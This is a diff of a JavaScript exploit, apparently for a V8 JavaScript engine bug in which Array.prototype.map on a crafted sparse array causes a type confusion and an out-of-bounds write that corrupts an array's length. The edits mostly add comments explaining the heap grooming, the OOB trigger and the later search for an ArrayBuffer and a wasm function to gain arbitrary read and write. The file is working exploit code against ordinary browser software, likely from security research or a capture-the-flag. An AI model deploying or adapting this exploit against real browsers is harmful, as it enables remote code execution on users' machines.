@@ -36,7 +36,10 @@ Array(2**30);
 
 var count = 0;
 var oobArr,gAb,gSig;
-let a = [,,,,,,,,,,,,,,,,]; //a.length==0x10
+let a = [,,,,,,,,,,,,,,,,];
+//a.length==0x10
+//if we change this,
+//offset in fill should be changed correspondingly
 function mapping(a) {
 	return a.map(function (x)
 	{
@@ -49,7 +52,7 @@ function mapping(a) {
 		count++;
 		if (count > 0x1000)
 			throw Error("otherwise page fault");
-		// because page size is smaller than
+		// because page size of from-to space is smaller than
 		// expected FixedDoubleArray length
 		return x;
 	});
@@ -72,7 +75,8 @@ a.fill(0,0x22);
 // skip data that has already been allocated,
 // and only rewrite blocks that have not been allocated yet
 // which does not make any difference
-// and we need this rewrite to make sure `a` is FixedArray
+// and we need this fill to make sure `a` is FixedArray
+// since too may empty slot makes `a` dictionary elements
 a.push(2019);
 a.length += 500;
 // now `a` is still a FixedArray,
@@ -84,10 +88,18 @@ dp(a);
 try
 {
 	mapping(a);
+	// this creates a new array with dictionary elements
+	// but it will be used as DoubleFixedArray
+	// (not sure why not FixedSmiArray)
+	// since size of NumberDictionary is only (2+0x10) * 8
+	// OOB write can be triggered
+	// and elements in `a` are crafted to only perform
+	// oobArr.length <- double(1337)
 }
 catch (e)
 {
 	// catch the throwed error
+	// so writing stop before any crash occur
 	// now oobArr is corrupted without any crashes
 	dp(oobArr);
 	gOobArr = oobArr;
@@ -101,9 +113,10 @@ gSig = {a:0xdead,b:0xbeef,c:wmain};
 // we can create gAb and gSig here,
 // and they are not too far from gOobArr
 // but if we create them just after oobArr is created
-// e.i. just after `oobArr = [13.37];`
+// e.i. just after `oobArr = [13.37];` before
 // vuln cannot be triggered, not sure why
 
+// regular OOB array exploit:
 // now gOobArr have OOB access
 // next, we find ArrayBuffer and sig
 var backingPos, wmainAddr;
